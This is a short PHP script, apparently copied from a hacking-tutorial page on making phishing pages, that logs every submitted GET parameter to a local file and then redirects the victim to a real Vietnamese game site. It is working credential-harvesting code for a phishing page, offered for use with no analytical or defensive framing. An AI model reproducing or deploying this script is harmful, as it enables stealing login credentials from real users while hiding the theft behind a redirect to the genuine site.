<?php
header ('Location: https://ddtank.garena.vn/');
$handle = fopen("log.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>

Read more: http://www.101hacker.com/2011/04/how-to-make-phisherfake-page-for-any.html#ixzz57qTPnNxR